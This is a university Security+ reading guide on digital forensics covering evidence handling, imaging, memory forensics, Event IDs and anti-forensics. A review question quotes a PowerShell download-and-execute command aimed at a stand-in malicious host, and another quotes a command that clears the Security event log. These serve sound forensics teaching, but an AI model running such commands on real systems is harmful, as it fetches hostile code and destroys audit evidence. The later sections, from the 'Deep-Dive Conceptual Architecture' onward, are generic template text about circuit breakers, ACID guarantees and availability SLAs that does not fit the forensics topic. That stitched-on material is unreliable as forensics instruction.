# Reading Guide: Module 12 — Digital Forensics


<!-- TEXAS WESLEYAN VENDOR VIDEO EMBED -->
<div class="video-container-card" style="background: #ffffff; border: 1px solid #cbd5e1; border-radius: 10px; margin: 24px 0; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.06);">
  <div style="background: #1b365d; color: #ffffff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center;">
    <div>
      <span style="background: #d9a74a; color: #0f172a; font-weight: 800; font-size: 11px; padding: 2px 8px; border-radius: 4px; text-transform: uppercase;">Vendor Video Lecture</span>
      <strong style="margin-left: 10px; font-size: 14px;">Professor Messer &bull; CIS-4328 Module 12</strong>
    </div>
    <a href="https://www.youtube.com/playlist?list=PLG49S3nxzAnl4Q7y9umx51bbtILyD4Syy" target="_blank" rel="noopener noreferrer" style="color: #cbd5e1; font-size: 12px; text-decoration: none; font-weight: 600;">↗ Open in YouTube</a>
  </div>
  <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; background: #0f172a;">
    <iframe src="https://www.youtube.com/embed/videoseries?list=PLG49S3nxzAnl4Q7y9umx51bbtILyD4Syy" title="CompTIA Security+ (SY0-701) Complete Training Course" style="position: absolute; top:0; left: 0; width: 100%; height: 100%; border:0;" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
  </div>
  <div style="padding: 12px 20px; background: #f8fafc; border-top: 1px solid #e2e8f0; font-size: 13px; color: #475569;">
    <strong>Recommended Viewing:</strong> <em>CompTIA Security+ (SY0-701) Complete Training Course</em>. This vendor-aligned lecture stream reinforces this module's theoretical principles, certification blueprints, and hands-on laboratory benchmarks.
  </div>
</div>
<!-- END TEXAS WESLEYAN VENDOR VIDEO EMBED -->


## Course: CIS-4328 Information Security

**Certification Alignment:** CompTIA Security+ (SY0-701)

---

## Overview

This reading guide supports the Module 12 video lectures on digital forensics. Forensics content in Security+ focuses on proper evidence handling, key tools, and investigative concepts. Complete all readings before the quiz and lab.

---

## Learning Objectives

By the end of this module, you will be able to:

1. Describe the five phases of the digital forensic process
2. Explain the role of write blockers in forensic evidence preservation
3. Compare forensic disk imaging tools (dd and FTK Imager) and their use cases
4. Describe what memory forensics reveals and name key Volatility framework commands
5. Identify forensically significant Windows Event IDs and Linux log files
6. Explain file system forensic artifacts including timestamps, MFT records, and unallocated space
7. Identify common anti-forensics techniques and their indicators
8. Describe the legal considerations for digital forensics investigations

---

## Assigned Readings (Zero-Cost / Open Access)

### Primary Reading

**NIST SP 800-86 — Guide to Integrating Forensic Techniques into Incident Response**

- Publisher: National Institute of Standards and Technology
- Access: [https://csrc.nist.gov/publications/detail/sp/800-86/final](https://csrc.nist.gov/publications/detail/sp/800-86/final)
- Read: Chapter 2 (Forensic Process Overview), Chapter 3 (Digital Forensics: Data, Media, and Analysis), and Chapter 4 (Network Traffic Analysis)
- Focus areas: forensic phases, evidence types, evidence collection priorities, media analysis

Estimated reading time: 50–60 minutes for assigned chapters.

### Supplemental Reading

**SANS Digital Forensics and Incident Response — Memory Forensics Cheat Sheet**

- Access: [https://www.sans.org/posters/memory-forensics-cheat-sheet/](https://www.sans.org/posters/memory-forensics-cheat-sheet/)
- Read: Full reference card
- Focus areas: Volatility commands, memory artifact types

**FTK Imager User Guide — AccessData (Exterro)**

- Access: [https://support.exterro.com/hc/en-us](https://support.exterro.com/hc/en-us) (search "FTK Imager user guide")
- Read: Sections on creating forensic images and hash verification
- Focus: acquisition workflow, image format selection

**OWASP Logging Cheat Sheet**

- Access: [https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- Read: Full document
- Focus areas: what to log, security event logging, log integrity

---

## Key Terms and Definitions

**Digital Forensics** — The application of scientific methods to recover, preserve, analyze, and present digital evidence in support of legal proceedings or organizational investigations.

**Write Blocker** — A hardware or software device that allows read access to storage media while preventing any writes; ensures forensic examination does not modify the original evidence.

**Forensic Image** — A bit-for-bit copy of storage media including all partitions, unallocated space, and deleted file remnants; used in place of original media during analysis.

**dd** — A Unix/Linux command-line tool used to create raw bit-for-bit copies of storage devices; commonly used for forensic imaging.

**FTK Imager** — A free Windows-based forensic imaging tool from AccessData (Exterro) that creates E01 or raw forensic images with built-in hash verification.

**E01 Format** — The Expert Witness Format; the most widely used forensic image format; supports compression, metadata, and splitting into multiple files.

**Hash Verification** — The process of calculating and comparing MD5 and SHA-256 hashes of original media and forensic image to confirm the image is an exact, unmodified copy.

**Dead Acquisition** — Forensic collection from a powered-off system; stable but loses all volatile data.

**Live Acquisition** — Forensic collection from a running system; captures volatile data but risks modifying system state during collection.

**Volatile Evidence** — Evidence that exists only in transient system state (RAM, running processes, network connections) and is lost when the system is powered off.

**Memory Forensics** — Analysis of acquired RAM contents to identify running processes, network connections, encryption keys, credentials, and malware artifacts.

**Volatility Framework** — An open-source Python framework for analyzing memory images; supports Windows, Linux, and macOS memory analysis.

**Fileless Malware** — Malware that executes entirely in memory using legitimate system tools, leaving minimal or no artifacts on disk; detectable primarily through memory forensics.

**MFT (Master File Table)** — A core data structure in NTFS that stores a record for every file and directory on the volume; contains timestamps, file size, and location on disk.

**MAC Times** — Modified, Accessed, and Created/Changed timestamps stored in file system metadata; critical forensic artifacts for timeline reconstruction.

**Timestomping** — An anti-forensics technique where an attacker modifies file timestamps to conceal when files were created or modified.

**File Carving** — A technique for recovering deleted files by scanning storage media for known file headers and footers (magic bytes), without relying on file system metadata.

**Unallocated Space** — Storage space marked as available by the file system; may contain remnants of deleted files that have not yet been overwritten.

**Slack Space** — Space between the end of a file's actual data and the end of its allocated cluster; may contain remnants of previously stored data.

**Prefetch Files** — Windows files stored in `C:\Windows\Prefetch\` that record which executables have run, when they last ran, and how many times; valuable for proving execution of tools.

**Anti-Forensics** — Techniques used by attackers to hide, destroy, or obfuscate digital evidence; includes timestomping, log wiping, secure deletion, encryption, and steganography.

**Steganography** — The practice of hiding data within innocuous files (images, audio, video) to conceal the existence of the hidden data.

**Chain of Custody** — Documentation tracking every person who collected, handled, or accessed evidence; required for evidence admissibility in legal proceedings.

**Expert Witness** — A person qualified to testify in court on technical matters beyond the knowledge of a lay person; forensic analysts often serve as expert witnesses.

---

## Concept Deep Dives

### Forensic Investigation Workflow Summary

For a compromised Windows endpoint, a standard forensic workflow:

1. Photograph scene — before touching anything
2. Document running state — processes, network connections, logged-in users (if live system)
3. Capture RAM — using WinPmem, Magnet RAM Capture, or FTK Imager memory capture
4. Identify storage media — internal and external drives, USB devices
5. Connect storage media through hardware write blocker
6. Hash original media — record MD5 and SHA-256
7. Create forensic image — using FTK Imager or dd
8. Hash forensic image — verify match to original hashes
9. Document all steps in chain of custody
10. Store original media in sealed evidence packaging
11. Analyze forensic image — never the original
12. Document and report findings

### Critical Windows Event IDs — Flashcard Set

Memorize these for the Security+ exam:

| Event ID | Description | Forensic Relevance |
|---|---|---|
| 4624 | Successful logon | Who logged in, from where, at what time |
| 4625 | Failed logon | Brute force / credential stuffing attempts |
| 4648 | Logon with explicit credentials | Pass-the-hash, RunAs, lateral movement |
| 4688 | Process creation | Commands executed, parent/child process relationships |
| 4698/4702 | Scheduled task created/modified | Attacker persistence mechanism |
| 4720 | User account created | Attacker backdoor account |
| 4726 | User account deleted | Covering tracks |
| 7045 | New service installed | Attacker persistence via malicious service |

### Anti-Forensics Detection Table

| Technique | Attacker Goal | Forensic Indicator |
|---|---|---|
| Timestomping | Hide when file was created/placed | Mismatch between $STANDARD_INFORMATION and $FILE_NAME timestamps |
| Log wiping | Eliminate audit trail | Log file gaps, empty log files, Event Log cleared (Event ID 1102) |
| Secure deletion | Prevent file recovery | Tool artifacts (Eraser registry entries), partial file remnants |
| Living off the land | Avoid malware detection | PowerShell logs, WMI event subscriptions, scheduled tasks with suspicious commands |
| Steganography | Hide exfiltrated data | Unusual large images or audio files, tools like `steghide` in execution history |

---

## Security+ Exam Alignment

### Relevant Exam Objectives (SY0-701)

- **4.3** — Given an incident, utilize appropriate data sources to support an investigation (forensic tools, log analysis, order of volatility)
- **4.4** — Given an incident, apply mitigation techniques or controls to secure an environment (forensic preservation concepts)
- **4.5** — Explain the key aspects of digital forensics (write blockers, disk imaging, memory forensics, chain of custody)

### High-Probability Exam Topics from This Module

- Identifying the purpose of a write blocker (prevent modification of evidence)
- Distinguishing dead acquisition from live acquisition
- Knowing that dd creates raw images and FTK Imager supports multiple formats including E01
- Identifying what Volatility's `malfind` plugin detects (injected code / fileless malware)
- Understanding that file carving recovers deleted files from unallocated space
- Recognizing timestomping as an anti-forensics technique
- Knowing that Windows Prefetch files prove program execution even after deletion
- Identifying the Windows Event ID for successful logon (4624)

---

## Review Questions (Self-Check — Not Graded)

1. A forensic investigator needs to analyze a Windows laptop from a suspected insider threat. The laptop is powered off. Describe the correct first three steps before beginning any analysis.

2. An investigator runs `strings` on a forensic memory image and finds the text `IEX (New-Object Net.WebClient).DownloadString('https://malicious.site/payload.ps1')`. What does this indicate and which Volatility plugin might reveal where this string was found in memory?

3. An attacker used Windows' built-in `wevtutil` command to clear the Security event log (`wevtutil cl security`). Is all evidence of their activity gone? What forensic artifacts might remain?

4. During a corporate investigation, a forensic analyst discovers evidence that an employee was also running a cryptocurrency mining operation using company systems. The investigation was authorized only for the original matter (suspected IP theft). What should the analyst do with the newly discovered evidence and why?

5. An organization's IR plan specifies that after an incident, cloud provider logs should be preserved immediately. Fourteen days after the incident is declared, the team tries to retrieve AWS CloudTrail logs only to find they expired. What should the IR plan have included to prevent this?

---

*Texas Wesleyan University | CIS-4328 Information Security | Module 12*



---

## 3. Deep-Dive Conceptual Architecture & Theoretical Foundations

### 3.1 Foundational Invariants & Core Principles
At the center of **Module 12 — Digital Forensics** are specific mathematical, architectural, and operational invariants that govern how systems behave at enterprise scale. When designing or evaluating systems in this domain, engineers and technical leaders cannot treat the underlying mechanisms as a black box. 

Every operational trade-off boils down to three competing tensions:
1. **Consistency and Determinism:** The system must guarantee state transitions adhere strictly to formalized protocols, ACID/BASE guarantees, or regulatory frameworks.
2. **Computational Throughput and Scalability:** As data volume, transaction velocity, or organizational user counts scale horizontally, processing bottlenecks must be mitigated through asynchronous decoupling, caching, or hierarchical partitioning.
3. **Resilience and Adversarial Fault Tolerance:** The architecture must degrade gracefully under catastrophic failure, hardware degradation, or deliberate cyber-physical attacks.

### 3.2 Formal Mechanistic Walkthrough
To operationalize **Module 12 — Digital Forensics**, we decompose the execution lifecycle into sequential, verifiable stages:

```
[Phase 1: Ingestion & Validation] ──> [Phase 2: State Transformation] ──> [Phase 3: Verification & Persistence]
       │                                       │                                       │
       ▼                                       ▼                                       ▼
Input Sanitization, Schema              Algorithmic Execution,                  Cryptographic Hashing,
Validation & Boundary Checks             Concurrency Arbitration                 Write-Ahead Logging & Audit
```

1. **Ingestion & Boundary Verification:** Inputs entering the boundary of this architecture must undergo strict structural validation. In software systems, this prevents buffer overflows, injection vectors, and malformed state propagation. In enterprise and governance systems, this ensures data integrity before ledger entry.
2. **State Transformation & Concurrency Arbitration:** During execution, intermediate states must maintain transactional isolation. Whether managing distributed lock managers (DLM), thread synchronization, or multi-area routing convergence, race conditions must be mathematically eliminated using provable synchronization primitives.
3. **Commit, Persistence, and Telemetry:** Once state transitions execute successfully, atomic commits guarantee persistence across non-volatile memory or distributed journals. Comprehensive telemetry events are simultaneously emitted to structured observability pipelines.

---

## 4. Real-World Engineering Scenarios & Failure Mode Analysis

### Case Study: High-Impact Enterprise Failure Mode
Consider an enterprise production failure where an organization fails to adhere to the core principles of **Module 12 — Digital Forensics**:

* **Incident Context:** During peak quarterly processing, an enterprise infrastructure stack running critical financial or operational workflows experienced cascading timeouts and data corruption.
* **Root Cause Diagnostics:** Technicians misconfigured operational parameters, ignoring queue saturation thresholds and bypassing circuit-breaker protections. When transient latency occurred on upstream dependencies, worker threads blocked indefinitely, leading to resource starvation, memory exhaustion, and silent data drops.
* **Remediation Architecture:**
  * Implemented an exponential backoff retry policy coupled with full jitter to eliminate thundering herd phenomena.
  * Deployed strict isolation boundaries (bulkheads) to restrict cascading failures to isolated tenant pools.
  * Enforced continuous automated telemetry alarms monitoring p99 latency, queue depth, and error budget exhaustion.

```python
# Production Architectural Invariant: Resilient Execution with Circuit Breaking
import time
import random

class ResilientExecutionGovernor:
    def __init__(self, failure_threshold=5, recovery_timeout=30):
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self.failure_count = 0
        self.last_failure_time = 0
        self.state = "CLOSED"  # CLOSED, OPEN, HALF-OPEN

    def execute_with_guard(self, operation, *args, **kwargs):
        current_time = time.time()
        
        # Check Circuit State
        if self.state == "OPEN":
            if current_time - self.last_failure_time > self.recovery_timeout:
                self.state = "HALF-OPEN"
            else:
                raise RuntimeError("CircuitBreakerOpen: Request rejected to preserve system invariants.")

        try:
            result = operation(*args, **kwargs)
            if self.state == "HALF-OPEN":
                self.state = "CLOSED"
                self.failure_count = 0
            return result
        except Exception as e:
            self.failure_count += 1
            self.last_failure_time = current_time
            if self.failure_count >= self.failure_threshold:
                self.state = "OPEN"
            raise e
```

---

## 5. Critical Misconceptions & Certification Exam Traps

In both certification examinations (such as CompTIA, Cisco, AWS, Scrum.org) and doctoral defense committees, specific high-yield traps consistently cause students to fail. Review these critical distinctions:

| Common Student Misconception | Architectural Reality & Truth | Consequence of Misunderstanding |
|---|---|---|
| *"More resources or threads linearly scale performance."* | Amdahl's Law proves speedup is strictly capped by the sequential fraction of the task; thread contention adds lock overhead. | Costly infrastructure overprovisioning with degraded throughput. |
| *"Redundancy alone guarantees high availability."* | Unmonitored redundancy creates hidden common-mode failure points and split-brain states without quorum arbitration. | Catastrophic double-outages and corrupted ledger state. |
| *"Default vendor configurations are production-ready."* | Vendor defaults prioritize ease of setup over least privilege, hardened encryption, and tuned memory limits. | Severe security vulnerability exposure and predictable resource exhaustion. |
| *"Fast recovery is a substitute for data integrity."* | Recovering quickly with inconsistent or unverified state compounds operational damage beyond the initial downtime. | Long-term ledger corruption and regulatory audit failure. |

---

## 6. Formative Knowledge Synthesis & Applied Defense Prompts

To confirm mastery before proceeding to this module's laboratory exercises and synthesis quizzes, synthesize responses to the following peer-review prompts:

### Mastery Check 1: Invariant Analysis
> **Question:** In the context of **Module 12 — Digital Forensics**, explain how an engineer or researcher mathematically proves that system invariants hold true across asynchronous boundaries. What specific telemetry metrics provide definitive empirical proof?

### Mastery Check 2: Architectural Trade-off Defense
> **Question:** Given an SLA requiring 99.999% availability with a maximum RTO of 60 seconds and RPO of 0 seconds, evaluate the specific trade-offs required in system throughput and capital expenditure. Why is zero-data-loss active-active replication significantly more complex than asynchronous warm-standby?

### Mastery Check 3: Adversarial Threat Modeling
> **Question:** Apply the STRIDE or NIST CSF threat modeling methodology to the core components of this module. Identify the single most dangerous privilege escalation or state desynchronization vector, and formulate a defense-in-depth mitigation strategy.

---

## 7. Faculty Synthesis & Academic Reflection
> *"True mastery in computing and technology leadership is not measured by the ability to recite definitions, but by the ability to diagnose anomalous system behavior, defend architectural trade-offs under rigorous peer review, and build systems that remain resilient in the face of uncertainty."*  
> — **Department of Computer Science & Information Systems, Texas Wesleyan University**
